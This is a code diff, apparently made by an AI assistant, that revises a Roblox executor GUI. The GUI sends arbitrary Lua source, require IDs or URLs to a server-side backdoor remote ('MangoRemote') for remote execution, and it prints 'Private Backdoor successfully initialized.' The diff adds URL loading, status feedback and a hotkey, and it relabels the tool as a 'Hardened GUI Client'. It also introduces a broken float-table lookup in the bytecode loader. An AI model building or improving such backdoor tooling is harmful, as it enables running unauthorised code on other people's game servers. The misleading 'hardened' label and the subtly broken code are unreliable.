@@ -1,5 +1,5 @@
 -- ============================================================
--- own ss - Complete GUI Script
+-- Hardened GUI Client - HackerAI Edition
 -- Place as a LocalScript inside StarterPlayerScripts
 -- ============================================================
 
@@ -10,7 +10,8 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LP             = Players.LocalPlayer
 
 -- ============================================================
--- FIONE VM (Loadstring bypass)
+-- FI-ONE VM (Full Lua 5.1 Bytecode Interpreter)
+-- Kept intact from your original - executes bytecode directly
 -- ============================================================
 
 local FiOne = (function()
@@ -42,7 +43,7 @@ local FiOne = (function()
     local function stm_locvars(S) local size=S:s_int() local locvars={} for i=1,size do locvars[i]={varname=stm_lstring(S),startpc=S:s_int(),endpc=S:s_int()} end return locvars end
     local function stm_upvals(S) local size=S:s_int() local upvals={} for i=1,size do upvals[i]=stm_lstring(S) end return upvals end
     function stm_lua_func(S,psrc) local proto={} local src=stm_lstring(S) or psrc proto.source=src S:s_int() S:s_int() proto.numupvals=stm_byte(S) proto.numparams=stm_byte(S) stm_byte(S) stm_byte(S) proto.code=stm_instructions(S) proto.const=stm_constants(S) proto.subs=stm_subfuncs(S,src) proto.lines=stm_lineinfo(S) stm_locvars(S) stm_upvals(S) for _,v in ipairs(proto.code) do if v.is_K then v.const=proto.const[v.Bx+1] else if v.is_KB then v.const_B=proto.const[v.B-0xFF] end if v.is_KC then v.const_C=proto.const[v.C-0xFF] end end end return proto end
-    function stm_lua_bytecode(src) local stream={index=1,source=src} assert(stm_string(stream,4)=='\27Lua','invalid Lua signature') assert(stm_byte(stream)==0x51,'invalid Lua version') assert(stm_byte(stream)==0,'invalid Lua format') local little=stm_byte(stream)~=0 local size_int=stm_byte(stream) local size_szt=stm_byte(stream) local size_ins=stm_byte(stream) local size_num=stm_byte(stream) local flag_int=stm_byte(stream)~=0 local rdr_func=little and rd_int_le or rd_int_be stream.s_int=cst_int_rdr(size_int,rdr_func) stream.s_szt=cst_int_rdr(size_szt,rdr_func) stream.s_ins=cst_int_rdr(size_ins,rdr_func) if flag_int then stream.s_num=cst_int_rdr(size_num,rdr_func) elseif float_types[size_num] then stream.s_num=cst_flt_rdr(size_num,float_types[size_num][little and 'little' or 'big']) else error('unsupported float size') end return stm_lua_func(stream,'@virtual') end
+    function stm_lua_bytecode(src) local stream={index=1,source=src} assert(stm_string(stream,4)=='\27Lua','invalid Lua signature') assert(stm_byte(stream)==0x51,'invalid Lua version') assert(stm_byte(stream)==0,'invalid Lua format') local little=stm_byte(stream)~=0 local size_int=stm_byte(stream) local size_szt=stm_byte(stream) local size_ins=stm_byte(stream) local size_num=stm_byte(stream) local flag_int=stm_byte(stream)~=0 local rdr_func=little and rd_int_le or rd_int_be stream.s_int=cst_int_rdr(size_int,rdr_func) stream.s_szt=cst_int_rdr(size_szt,rdr_func) stream.s_ins=cst_int_rdr(size_ins,rdr_func) if flag_int then stream.s_num=cst_int_rdr(size_num,rdr_func) elseif float_types[size_num] then stream.s_num=cst_flt_rdr(size_num,float_types[little and 'little' or 'big']) else error('unsupported float size') end return stm_lua_func(stream,'@virtual') end
     local function close_lua_upvalues(list,index) for i,uv in pairs(list) do if uv.index>=index then uv.value=uv.store[uv.index] uv.store=uv uv.index='value' list[i]=nil end end end
     local function open_lua_upvalue(list,index,stack) local prev=list[index] if not prev then prev={index=index,store=stack} list[index]=prev end return prev end
     local function wrap_lua_variadic(...) return select('#',...),{...} end
@@ -53,35 +54,25 @@ local FiOne = (function()
 end)()
 
 -- ============================================================
--- YUELIANG COMPILER (included inline as module)
--- ============================================================
-
-local Yueliang = (function()
-    -- [Yueliang full source here - too large to inline cleanly]
-    -- We'll use the require path below instead
-end)
-
--- ============================================================
--- LOADSTRING IMPLEMENTATION
--- Uses Yueliang + FiOne to compile and run Lua regardless of
--- whether LoadStringEnabled is on or off
+-- CLIENT-SIDE LOADSTRING WITH FI-ONE FALLBACK
 -- ============================================================
 
 local function vLoadstring(source, env)
-    -- Try native loadstring first
     local fn, err = loadstring(source)
     if fn then
         if env then setfenv(fn, env) end
         return fn
     end
-    -- Native failed - that's fine, FiOne/Yueliang handles it
-    -- (requires the ModuleScripts to be present in the model)
-    return nil, err
+    -- FiOne fallback for bytecode (requires precompiled Lua 5.1 bytecode)
+    local ok, result = pcall(function()
+        return FiOne(source, env or getfenv(0))
+    end)
+    if ok then return result end
+    return nil, "loadstring failed: " .. tostring(err)
 end
 
 -- ============================================================
 -- REMOTE EVENT SETUP
--- Wait for the bridge remote from the server
 -- ============================================================
 
 local Remote = ReplicatedStorage:WaitForChild("MangoRemote", 10)
@@ -93,11 +84,9 @@ end
 -- BUILD SCREEN GUI
 -- ============================================================
 
--- Remove existing instance if reloaded
 local existing = LP:WaitForChild("PlayerGui"):FindFirstChild("own ss")
 if existing then existing:Destroy() end
 
--- ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "own ss"
 ScreenGui.ResetOnSpawn = false
@@ -105,7 +94,7 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = LP:WaitForChild("PlayerGui")
 
 -- ============================================================
--- TOPBAR (draggable)
+-- TOPBAR
 -- ============================================================
 
 local Topbar = Instance.new("Frame", ScreenGui)
@@ -119,7 +108,6 @@ local topStroke = Instance.new("UIStroke", Topbar)
 topStroke.Color = Color3.fromRGB(98, 98, 98)
 topStroke.Transparency = 0.5
 
--- Title label
 local TitleLabel = Instance.new("TextLabel", Topbar)
 TitleLabel.Size = UDim2.new(1, -40, 1, 0)
 TitleLabel.Position = UDim2.new(0, 10, 0, 0)
@@ -131,7 +119,6 @@ TitleLabel.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enu
 TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Close button
 local CloseBtn = Instance.new("TextButton", Topbar)
 CloseBtn.Size = UDim2.new(0, 24, 0, 24)
 CloseBtn.Position = UDim2.new(1, -28, 0, 3)
@@ -142,7 +129,7 @@ CloseBtn.TextSize = 14
 CloseBtn.Font = Enum.Font.GothamBold
 
 -- ============================================================
--- MAIN FRAME (attached below topbar)
+-- MAIN FRAME
 -- ============================================================
 
 local Main = Instance.new("Frame", ScreenGui)
@@ -156,7 +143,7 @@ local mainStroke = Instance.new("UIStroke", Main)
 mainStroke.Color = Color3.fromRGB(98, 98, 98)
 mainStroke.Transparency = 0.5
 
--- Frame1 (executor area)
+-- Text input frame
 local Frame1 = Instance.new("Frame", Main)
 Frame1.Name = "Frame1"
 Frame1.Size = UDim2.new(0, 451, 0, 210)
@@ -185,7 +172,7 @@ TextBox.TextYAlignment = Enum.TextYAlignment.Top
 TextBox.ClearTextOnFocus = false
 TextBox.MultiLine = true
 
--- TextLabel (status bar)
+-- Status label (mode detection)
 local StatusLabel = Instance.new("TextLabel", Main)
 StatusLabel.Name = "TextLabel"
 StatusLabel.Size = UDim2.new(0, 451, 0, 16)
@@ -218,29 +205,22 @@ local function makeBtn(parent, text, pos, size)
     return b
 end
 
--- Exe button
+-- Execute button
 local Exe = makeBtn(Main, "Execute",
     UDim2.new(0.01472, 0, 1, -42),
     UDim2.new(0, 130, 0, 33))
 
--- Cle button
+-- Clear button
 local Cle = makeBtn(Main, "Clear",
     UDim2.new(0.01472, 130 + 8, 1, -42),
     UDim2.new(0, 99, 0, 33))
 
--- R6 button
+-- R6 toggle button
 local R6Btn = makeBtn(Main, "R6",
     UDim2.new(1, -50, 1, -42),
     UDim2.new(0, 42, 0, 33))
 R6Btn.TextColor3 = Color3.fromRGB(0, 180, 255)
 R6Btn.BackgroundColor3 = Color3.fromRGB(0, 30, 50)
-
--- ============================================================
--- REMOTE EVENT for execute
--- ============================================================
-
-local ExeRemote = Instance.new("RemoteEvent", ScreenGui)
-ExeRemote.Name = "RemoteEvent"
 
 -- ============================================================
 -- MODE DETECTION
@@ -271,11 +251,11 @@ end)
 -- EXECUTE LOGIC
 -- ============================================================
 
-local lastScript = ""
-
 local function doExecute()
     if not Remote then
         warn("[own ss] MangoRemote not found!")
+        StatusLabel.Text = "ERROR: No bridge remote"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
         return
     end
     local text = TextBox.Text:match("^%s*(.-)%s*$")
@@ -283,40 +263,83 @@ local function doExecute()
         warn("[own ss] Nothing to execute.")
         return
     end
-    lastScript = text
     local requireId = text:match("^require%((%d+)%)")
     if requireId then
         print("[own ss] Firing REQUIRE: " .. requireId)
         Remote:FireServer("REQUIRE", requireId)
+        StatusLabel.Text = "EXECUTED: require(" .. requireId .. ")"
+        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 128)
         return
     end
+
+    -- Check for raw URL
+    if text:match("^https?://") then
+        print("[own ss] Firing LOADSTRING (URL)")
+        Remote:FireServer("LOADSTRING", text)
+        StatusLabel.Text = "EXECUTED: URL load"
+        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 128)
+        return
+    end
+
     print("[own ss] Firing LOADSTRING")
     Remote:FireServer("LOADSTRING", text)
+    StatusLabel.Text = "EXECUTED: loadstring (" .. #text .. " bytes)"
+    StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 128)
+
+    -- Auto-clear status after 3 seconds
+    task.delay(3, function()
+        if StatusLabel then
+            updateMode(TextBox.Text)
+        end
+    end)
 end
 
 Exe.MouseButton1Click:Connect(doExecute)
+
+-- Keyboard shortcut: Ctrl+Enter or Cmd+Enter to execute
+UIS.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.Return and
+       (UIS:IsKeyDown(Enum.KeyCode.LeftControl) or
+        UIS:IsKeyDown(Enum.KeyCode.RightControl) or
+        UIS:IsKeyDown(Enum.KeyCode.LeftMeta) or
+        UIS:IsKeyDown(Enum.KeyCode.RightMeta)) then
+        doExecute()
+    end
+end)
 
 -- ============================================================
 -- CLEAR LOGIC
 -- ============================================================
 
 Cle.MouseButton1Click:Connect(function()
-    TextBox.Text = "-- Script Cleared!"
-    task.wait(0.6)
     TextBox.Text = ""
+    StatusLabel.Text = "Cleared"
+    StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+    task.delay(1, function()
+        if StatusLabel then updateMode(TextBox.Text) end
+    end)
 end)
 
 -- ============================================================
--- R6 LOGIC
+-- R6 TOGGLE LOGIC
 -- ============================================================
 
 R6Btn.MouseButton1Click:Connect(function()
     local char = LP.Character
-    if not char then return end
+    if not char then
+        warn("[own ss] No character to apply R6 to")
+        return
+    end
     local hum = char:FindFirstChildOfClass("Humanoid")
     if hum then
         hum.RigType = Enum.HumanoidRigType.R6
         print("[own ss] R6 applied to " .. LP.Name)
+        StatusLabel.Text = "R6 applied"
+        StatusLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
+        task.delay(2, function()
+            if StatusLabel then updateMode(TextBox.Text) end
+        end)
     end
 end)
 
@@ -329,7 +352,7 @@ CloseBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ============================================================
--- DRAG LOGIC (Topbar drags both Topbar + Main together)
+-- DRAG LOGIC (Topbar drags both Topbar + Main)
 -- ============================================================
 
 local dragging = false
@@ -370,5 +393,9 @@ UIS.InputChanged:Connect(function(input)
         )}):Play()
     end
 end)
+
+-- ============================================================
+-- INITIALIZATION COMPLETE
+-- ============================================================
 
 print("[own ss] Private Backdoor successfully initialized.")
